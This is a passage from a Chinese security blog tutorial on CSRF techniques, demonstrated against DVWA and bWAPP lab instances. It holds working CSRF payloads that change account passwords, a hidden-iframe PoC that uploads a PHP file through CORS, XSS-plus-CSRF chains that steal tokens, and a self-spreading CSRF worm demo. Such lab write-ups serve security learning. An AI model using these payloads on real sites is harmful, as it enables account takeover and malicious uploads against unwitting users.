class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>img标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>iframe标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>script标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span> /&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>link标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过CSS触发：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change#'</span>);&#125;</span><br></pre></td></tr></table></figure><p>当然要通过标签引入该CSS文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"csrf.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-CSRF-XSS漏洞组合拳"><a href="#0x05-CSRF-XSS漏洞组合拳" class="headerlink" title="0x05 CSRF+XSS漏洞组合拳"></a>0x05 CSRF+XSS漏洞组合拳</h2><h3 id="CSRF-XSS"><a href="#CSRF-XSS" class="headerlink" title="CSRF+XSS"></a>CSRF+XSS</h3><p>这是最常见的前端漏洞组合拳。通常用于对漏洞的深度利用，或者是对防御的一种绕过利用，比如站点对CSRF漏洞设置了token机制来进行防御、但站点存在XSS漏洞可窃取CSRF token导致CSRF防御形同虚设，又如站点设置了HttpOnly限制XSS不能窃取用户cookie信息、但站点存在CSRF漏洞可被利用来进行其他的一些恶意表单操作。</p><blockquote><p>生成一个随机Token是防御CSRF的经典方法之一。在页面涉及到表单时，会在服务器端生成一个Token，在页面加载时创建一个值为Token的<code>input</code>，插入到表单中，并设置<code>type=”hidden“</code>隐藏。当提交表单时，会将这个Token值一起提交。服务器端验证这个Token是否正确，如果不正确就会扔掉此次请求。本来只要获取目标页面Token的值，这种防御方法就会无效。<strong>但CSRF攻击是在其他网站发起的，由于同源策略，发起攻击的网站B不能读取被攻击的网站A的内容，只能够对其发送请求。因此攻击者是无法获取Token值的，CSRF攻击就此失效。</strong>但当目标网站有一个XSS漏洞时，我们便可以先发送一次请求，通过JS的跨域方法绕过同源策略，从而读取网站A页面中的Token值。再发送第二次请求，带上Token值，完成CSRF攻击。博主这里使用<code>window.name</code>来跨域窃取Token值。假如发起攻击的网站为B，受害站点为A。</p><p>1.在A网站的URL中构造XSS payload，实现以下功能：</p><ul><li>获取本页面的Token值</li><li>将Token值赋值给<code>window.name</code></li></ul><p>2.在B网站中插入实现以下功能的JS：</p><ul><li><p>创建一个<code>iframe</code>，并将<code>iframe.src</code>设为上面构造好的带有XSS payload的A网站的URL</p></li><li><p>写一个<code>function</code>，首先将<code>iframe.contentWindow.location</code>设为任意一个与B网站同源的页面，然后使<code>window.name = iframe.contentWindow.name</code></p><p>修改<code>iframe.contentWindow.location</code>的原因是：当<code>iframe</code>中的页面为A网站的页面时，与B网站为不同源的，不能将<code>iframe</code>的<code>window.name</code>赋值给当前B网站窗口的<code>window.name</code>。但是我们把<code>iframe</code>中的页面换为与B网站同源的页面时，是可以进行<code>window.name</code>的赋值的。由于<code>window.name</code>的特性，其值本身与网站无关，是窗口的一个值。因此修改页面后<code>window.name</code>并未改变，我们就可以顺利取出了。</p></li><li><p>将这个<code>iframe</code>销毁</p></li></ul><p>3.在B网站中插入真正的CSRF payload，带上已成功获取的<code>window.name</code>中的Token值，进行攻击。</p></blockquote><p>案例：<a href="https://www.cnblogs.com/xishaonian/p/6557769.html" target="_blank" rel="noopener">一次csrf配合xss的攻击实例</a></p><p>下面简单举例DVWA中XSS与CSRF漏洞的组合利用。</p><p>我们知道DVWA的CSRF的low级是无验证原密码就修改密码的，提交的是GET表单请求，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>在留言的地方即存储型XSS处，注入XSS的payload，内容为script标签，其中src属性值为CSRF攻击请求：</p><p><img src="/2020/01/21/CSRF-Tricks小结/10.png" alt=""></p><p>当其他用户访问到该留言内容时，就会被自动进行CSRF攻击篡改密码了：</p><p><img src="/2020/01/21/CSRF-Tricks小结/11.png" alt=""></p><h3 id="CSRF-Self-XSS"><a href="#CSRF-Self-XSS" class="headerlink" title="CSRF+Self-XSS"></a>CSRF+Self-XSS</h3><p>对于Self-XSS，我们知道该类型的XSS漏洞是由用户自己输入给自己造成的攻击的一种XSS，很鸡肋。但如果Self-XSS和CSRF组合利用，则可以将漏洞影响面从用户自己本身扩展到了其他的用户，提高了漏洞的危害性。比如一个需登录站点存在一个Self-XSS，一般是用户自己才能自己搞自己，但是如果站点存在CSRF，则可以直接用来跨站伪造发起Self-XSS来窃取受害者的cookie信息。</p><blockquote><p>一般来说，个人信息修改页面只有用户自己才能够看得到。假设网站A右上角的<code>你好，用户</code>这个地方存在XSS，并且在修改昵称为XSS payload后能够触发这个XSS。但是这个网站没有能够让其他用户看到你昵称的类似于留言板讨论区的地方，而管理员也一百年不会去看一下你的昵称，这个XSS就成为了一个鸡肋的SELF-XSS。因为普通用户怎么可能把昵称改成XSS payload来把Cookie送给你，你又没办法把自己的昵称改成恶意代码然后让别人看到，所以只能用来X自己。但如果同时这个网站有一个CSRF漏洞的话那就不一样了。我们可以通过以下操作来打任意用户的Cookie：</p><p>1.在恶意网站B中写入CSRF payload，使用这个CSRF来修改用户在A网站的昵称为XSS payload</p><p>2.诱惑用户访问恶意网站B，CSRF payload触发，用户在A网站的昵称被修改为XSS payload</p><p>3.用户重新访问A网站时，由于右上角显示了昵称，所以会触发对应的XSS payload，乖乖的把Cookie给你送过来</p><p>这样，一个SELF-XSS便被利用了。恶意网站B可以是我们自己建立的，也可以是某些存在XSS漏洞的大型网站，通常大型网站更容易受信任。这些大型网站可能本身设置了<code>HTTP-ONLY</code>导致攻击者无法拿到Cookie，又不好做其他操作。但是用来做攻击其他网站的跳板却是无法防范的。</p></blockquote><p>CSRF+Self-XSS案例：<a href="https://www.freebuf.com/articles/web/164069.html" target="_blank" rel="noopener">鸡肋CSRF和Self-XSS组合的变废为宝</a></p><p>JSON CSRF+Self-XSS案例：<a href="https://parrotsec-cn.org/t/topic/1423" target="_blank" rel="noopener">一次XSS+CSRF的组合拳进攻(CSRF+JSON)</a></p><h2 id="0x06-CSRF-文件上传漏洞组合拳"><a href="#0x06-CSRF-文件上传漏洞组合拳" class="headerlink" title="0x06 CSRF+文件上传漏洞组合拳"></a>0x06 CSRF+文件上传漏洞组合拳</h2><p>我们知道，文件上传都是通过POST方式来上传的，而POST方式的CSRF只能通过表单的方式来发起攻击。这就存在一个问题，就是构造的表单提交的数据跟浏览器文件上传提交的数据会有所区别，即上传的请求会有一个filename的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------70772515222937</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------70772515222937</span><br></pre></td></tr></table></figure><p>如果通过构造表单的方式实现文件上传，是没办法构造filename参数的，这是因为filename参数是由<code>&lt;input&gt;</code>标签自动生成的，是没办法通过表单来实现伪造的，从而能防御CSRF实现文件上传。</p><p>但自从HTML5出现后，有个叫CORS（跨域资源共享）的东西，让我们能够实现CSRF来上传文件。具体点说，就是利用JavaScript来对目标站点的上传点发起文件上传请求，<strong>这是因为CORS虽然不允许非法的外域读取本站点的资源、但并不阻止外域向本站发起请求，而CSRF刚刚好只是发起操作请求而非读取站点资源，这就构成了CSRF+文件上传漏洞的组合拳场景</strong>。</p><p>这种方式用BP就能生成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">      &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http:\/\/192.168.10.132\/dvwa\/vulnerabilities\/upload\/"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart\/form-data; boundary=---------------------------30913605125121"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> body = <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"100000\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"uploaded\"; filename=\"phpinfo.php\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Type: application/octet-stream\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\x3c?php\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"    phpinfo();\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"?\x3e\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"Upload\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Upload\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121--\r\n"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span></span><br><span class="line"><span class="undefined">          aBody[i] = body.charCodeAt(i); </span></span><br><span class="line"><span class="actionscript">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后自己再添加下JS自动点击上传按钮，并用iframe标签来隐藏攻击过程即可。</p><p>csrf.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">      &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http:\/\/192.168.10.132\/dvwa\/vulnerabilities\/upload\/"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart\/form-data; boundary=---------------------------30913605125121"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> body = <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"100000\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"uploaded\"; filename=\"phpinfo.php\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Type: application/octet-stream\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\x3c?php\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"    phpinfo();\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"?\x3e\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"Upload\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Upload\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121--\r\n"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span></span><br><span class="line"><span class="undefined">          aBody[i] = body.charCodeAt(i); </span></span><br><span class="line"><span class="actionscript">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>csrf_iframe.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">hidden</span>=<span class="string">"hidden"</span>&gt;</span>hi<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使已登录的用户访问，成功实现CSRF上传文件：</p><p><img src="/2020/01/21/CSRF-Tricks小结/1.png" alt=""></p><p><img src="/2020/01/21/CSRF-Tricks小结/2.png" alt=""></p><h2 id="0x07-CSRF蠕虫"><a href="#0x07-CSRF蠕虫" class="headerlink" title="0x07 CSRF蠕虫"></a>0x07 CSRF蠕虫</h2><blockquote><p>其实CSRF蠕虫漏洞本身还是一个CSRF漏洞，只不过基于漏洞的具体场景特殊性，一旦这个场景使得这个csrf具备了传播型，那么该漏洞就赋予了蠕虫性质。</p></blockquote><p>其实，CSRF蠕虫并非必须和XSS组合才能触发，仅仅是CSRF漏洞也能发起蠕虫攻击，前提是该CSRF是可以控制发起的表单中的内容指向为该CSRF payload本身，导致循环触发。</p><p>比如一个提交帖子的表单操作存在CSRF漏洞，然而攻击者利用这个漏洞通过提交恶意表单来往帖子里的内容写入恶意的地址，该地址正是该CSRF漏洞的PoC，如此一来只要其他用户访问这个帖子的链接即可自动被CSRF攻击、以该用户身份新建一个一毛一样的帖子，然后就继续传染下去。</p><p>案例参考：</p><p><a href="https://www.codercto.com/a/40828.html" target="_blank" rel="noopener">基于社交媒体的csrf蠕虫风暴探索</a></p><p><a href="https://www.uedbox.com/post/36858/" target="_blank" rel="noopener">新浪另类CSRF蠕虫放大危害</a></p><p><a href="https://bbs.ichunqiu.com/thread-21477-1-1.html" target="_blank" rel="noopener">经典的XSS+CSRF结合造成的蠕虫病毒式推广</a></p><p><a href="https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html" target="_blank" rel="noopener">分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</a></p><h3 id="Demo1——纯CSRF蠕虫"><a href="#Demo1——纯CSRF蠕虫" class="headerlink" title="Demo1——纯CSRF蠕虫"></a>Demo1——纯CSRF蠕虫</h3><p>下面我们以bWAPP的XSS - Stored (Blog)作为场景，因为这是一个博客留言的系统，适用于CSRF蠕虫的演示。</p><p>我们先新建一个alan用户，博客内容写上我们CSRF蠕虫payload的地址，这时所有用户都能查看：</p><p><img src="/2020/01/21/CSRF-Tricks小结/3.png" alt=""></p><p>csrf_iframe.html为引用iframe隐藏CSRF攻击过程页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">hidden</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>csrf.html，针对提交博客内容的表单请求发起CSRF攻击，博文内容指向csrf_iframe.html、这就形成了恶意的循环、造成CSRF蠕虫，这里JS自动点击提交：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.10.133/bWAPP/xss_stored_1.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry"</span> <span class="attr">value</span>=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#95;iframe&amp;#46;html"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"blog"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry&amp;#95;add"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当其他用户如bee登录博客系统，就能看到alan用户的发的博客是个链接，当bee用户点击访问时就会自动触发CSRF蠕虫攻击：</p><p><img src="/2020/01/21/CSRF-Tricks小结/4.png" alt=""></p><p>再回到Blog界面会看到，bee用户也发布了一样的博文，说明被成功CSRF蠕虫攻击：</p><p><img src="/2020/01/21/CSRF-Tricks小结/5.png" alt=""></p><p>如此下去，其他用户看到并访问即可继续感染CSRF蠕虫。</p><h3 id="Demo2——XSS-CSRF组合蠕虫"><a href="#Demo2——XSS-CSRF组合蠕虫" class="headerlink" title="Demo2——XSS+CSRF组合蠕虫"></a>Demo2——XSS+CSRF组合蠕虫</h3><p>进一步的，如果站点还存在XSS漏洞，那么XSS+CSRF蠕虫的攻击将更为深入。</p><p>还是以前面的Blog系统为例，删除掉前面创建的博客内容。我们以新建alan用户登录并验证是否存在存储型XSS，提交博文内容为<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>：</p><p><img src="/2020/01/21/CSRF-Tricks小结/6.png" alt=""></p><p>编写csrf.html如下，对提交博文进行CSRF攻击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"csrf"</span> <span class="attr">action</span>=<span class="string">"http://192.168.10.133/bWAPP/xss_stored_1.php"</span> <span class="attr">method</span>=<span 